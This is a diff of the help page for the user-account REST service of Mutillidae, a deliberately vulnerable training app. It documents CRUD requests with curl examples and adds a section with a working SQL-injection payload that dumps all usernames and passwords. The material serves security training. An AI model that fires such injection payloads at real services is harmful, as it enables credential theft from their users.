@@ -3,144 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WS User Account Service Documentation</title>
+    <title>User Account Web Service Documentation</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0 2rem;
-            background-color: #f5f5f5;
+            line-height: 1.6;
         }
-        h1, h2 {
-            color: #2c3e50;
+        a {
+            text-decoration: none;
+            font-weight: bold;
         }
         pre {
-            background-color: #ecf0f1;
-            padding: 1rem;
+            background-color: #f4f4f4;
+            padding: 10px;
             border-radius: 5px;
-            overflow-x: auto;
-        }
-        code {
-            font-family: Consolas, "Courier New", monospace;
-            font-size: 1rem;
-        }
-        ul {
-            line-height: 1.8;
-        }
-        .note {
-            background-color: #e7f3fe;
-            border-left: 6px solid #2196F3;
-            margin: 1rem 0;
-            padding: 0.5rem 1rem;
         }
     </style>
 </head>
 <body>
-    <h1>WS User Account Service Documentation</h1>
-    <p>
-        The <strong>WS User Account Service</strong> allows you to manage user accounts through multiple HTTP methods: 
-        creating, retrieving, updating, and deleting accounts.
-    </p>
-
-    <div class="note">
-        <strong>Note for Beginners:</strong> 
-        This guide provides easy-to-follow examples for each HTTP method using both Burp Repeater and <code>curl</code>.
-    </div>
-
-    <h2>Endpoint</h2>
-    <pre><code>/webservices/rest/ws-user-account.php</code></pre>
-
-    <h2>Supported HTTP Methods</h2>
-    <ul>
-        <li><b>GET</b>: Retrieve account information.</li>
-        <li><b>POST</b>: Create a new account.</li>
-        <li><b>PUT</b>: Update or create an account.</li>
-        <li><b>DELETE</b>: Delete an existing account.</li>
-        <li><b>OPTIONS</b>: Retrieve CORS-related metadata.</li>
-    </ul>
-
-    <h2>Request and Response Examples</h2>
-
-    <h3>1. GET (Retrieve Account Information)</h3>
-    <pre><code>GET /webservices/rest/ws-user-account.php?username=adrian HTTP/1.1
+<a href="//mutillidae.localhost/index.php">Back to Home Page</a>
+<br>
+<div>
+    <h2>Welcome to the User Account Web Service</h2>
+    <p>This service allows you to <strong>create, read, update, and delete</strong> user accounts using various HTTP methods.</p>
+    <p><strong>Note:</strong> This service is vulnerable to SQL injection at security level 0. Be cautious when testing or exploring its functionality.</p>
+</div>
+<hr>
+<h3>Supported HTTP Methods</h3>
+<h4>1. GET (Retrieve Data)</h4>
+<p>Use GET requests to retrieve information about one or more accounts.</p>
+<p><strong>Optional Parameter:</strong> <code>username</code> (as a URL parameter)</p>
+<ul>
+    <li>If <code>username=*</code>, all accounts will be returned.</li>
+    <li>If <code>username</code> is specified, details for that user will be returned.</li>
+</ul>
+<strong>Examples:</strong><br>
+<ul>
+    <li>Retrieve a specific user:
+        <pre>
+GET /webservices/rest/ws-user-account.php?username=adrian HTTP/1.1
 Host: mutillidae.localhost
 Accept: application/json
-Connection: close</code></pre>
-
-    <h4>Response</h4>
-    <pre><code>{
-    "Result": {
-        "Accounts": [
-            {
-                "username": "adrian",
-                "firstname": "Adrian",
-                "lastname": "Smith",
-                "signature": "AS"
-            }
-        ]
-    }
-}</code></pre>
-
-    <h3>2. POST (Create a New Account)</h3>
-    <pre><code>POST /webservices/rest/ws-user-account.php HTTP/1.1
+        </pre>
+        <strong>cURL Example:</strong>
+        <pre>
+curl -X GET "http://mutillidae.localhost/webservices/rest/ws-user-account.php?username=adrian" \
+  -H "Accept: application/json"
+        </pre>
+    </li>
+    <li>Retrieve all users:
+        <pre>
+GET /webservices/rest/ws-user-account.php?username=* HTTP/1.1
+Host: mutillidae.localhost
+Accept: application/json
+        </pre>
+        <strong>cURL Example:</strong>
+        <pre>
+curl -X GET "http://mutillidae.localhost/webservices/rest/ws-user-account.php?username=*" \
+  -H "Accept: application/json"
+        </pre>
+    </li>
+</ul>
+<hr>
+<h4>2. POST (Create New Account)</h4>
+<p>Use POST requests to create a new user account.</p>
+<p><strong>Required Parameters (POST body):</strong></p>
+<ul>
+    <li><code>username</code>: The username for the new account</li>
+    <li><code>password</code>: The password for the new account</li>
+    <li><code>firstname</code>: User's first name</li>
+    <li><code>lastname</code>: User's last name</li>
+</ul>
+<p><strong>Optional Parameter:</strong> <code>signature</code> (User's signature)</p>
+<strong>Example:</strong><br>
+<pre>
+POST /webservices/rest/ws-user-account.php HTTP/1.1
 Host: mutillidae.localhost
 Content-Type: application/x-www-form-urlencoded
 
-username=john&password=pass123&firstname=John&lastname=Doe&signature=JD</code></pre>
-
-    <h4>Response</h4>
-    <pre><code>{
-    "Result": "Inserted account 'john'",
-    "Success": true
-}</code></pre>
-
-    <h3>3. PUT (Update or Create an Account)</h3>
-    <p>If the account exists, it will be updated; otherwise, it will be created.</p>
-    <pre><code>PUT /webservices/rest/ws-user-account.php HTTP/1.1
+username=john&password=pass123&firstname=John&lastname=Doe&signature=JDoe
+</pre>
+<strong>cURL Example:</strong>
+<pre>
+curl -X POST "http://mutillidae.localhost/webservices/rest/ws-user-account.php" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=john&password=pass123&firstname=John&lastname=Doe&signature=JDoe"
+</pre>
+<hr>
+<h4>3. PUT (Create or Update Account)</h4>
+<p>Use PUT requests to <strong>create or update</strong> an existing user account.</p>
+<p><strong>Required Parameters (POST body):</strong> Same as POST</p>
+<p>If the account exists, it will be updated. If not, a new account will be created.</p>
+<strong>Example:</strong><br>
+<pre>
+PUT /webservices/rest/ws-user-account.php HTTP/1.1
 Host: mutillidae.localhost
 Content-Type: application/x-www-form-urlencoded
 
-username=john&password=newpass123&firstname=John&lastname=Doe&signature=JDoeUpdated</code></pre>
-
-    <h4>Response</h4>
-    <pre><code>{
-    "Result": "Updated account 'john'.",
-    "RowsAffected": 1,
-    "Success": true
-}</code></pre>
-
-    <h3>4. DELETE (Delete an Account)</h3>
-    <pre><code>DELETE /webservices/rest/ws-user-account.php HTTP/1.1
+username=john&password=newpass123&firstname=John&lastname=Doe&signature=JDoeUpdated
+</pre>
+<strong>cURL Example:</strong>
+<pre>
+curl -X PUT "http://mutillidae.localhost/webservices/rest/ws-user-account.php" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=john&password=newpass123&firstname=John&lastname=Doe&signature=JDoeUpdated"
+</pre>
+<hr>
+<h4>4. DELETE (Remove Account)</h4>
+<p>Use DELETE requests to delete an existing user account.</p>
+<p><strong>Required Parameters (POST body):</strong></p>
+<ul>
+    <li><code>username</code>: The username of the account to be deleted</li>
+    <li><code>password</code>: The password for the account</li>
+</ul>
+<strong>Example:</strong><br>
+<pre>
+DELETE /webservices/rest/ws-user-account.php HTTP/1.1
 Host: mutillidae.localhost
 Content-Type: application/x-www-form-urlencoded
 
-username=john&password=newpass123</code></pre>
-
-    <h4>Response</h4>
-    <pre><code>{
-    "Result": "Deleted account 'john'.",
-    "Success": true
-}</code></pre>
-
-    <h3>5. OPTIONS (CORS Metadata)</h3>
-    <pre><code>OPTIONS /webservices/rest/ws-user-account.php HTTP/1.1
+username=john&password=newpass123
+</pre>
+<strong>cURL Example:</strong>
+<pre>
+curl -X DELETE "http://mutillidae.localhost/webservices/rest/ws-user-account.php" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=john&password=newpass123"
+</pre>
+<hr>
+<h4>Example Exploits (SQL Injection)</h4>
+<p>This service is vulnerable to SQL injection at security level 0. Example:</p>
+<pre>
+GET /webservices/rest/ws-user-account.php?username=jeremy'+union+select+concat('The+password+for+',username,'+is+',password),mysignature+from+accounts+-- HTTP/1.1
 Host: mutillidae.localhost
-Origin: http://mutillidae.localhost</code></pre>
-
-    <h4>Response</h4>
-    <pre><code>HTTP/1.1 204 No Content
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
-Access-Control-Allow-Headers: Content-Type, Authorization</code></pre>
-
-    <div class="note">
-        <strong>Troubleshooting Tips:</strong> 
-        <ul>
-            <li>Ensure that the <code>mutillidae.localhost</code> host is correctly configured in your environment.</li>
-            <li>If using Burp Suite, confirm that your browser or tool is correctly routing traffic.</li>
-            <li>Review CORS headers in the OPTIONS response to avoid cross-origin issues.</li>
-        </ul>
-    </div>
-
+</pre>
 </body>
 </html>
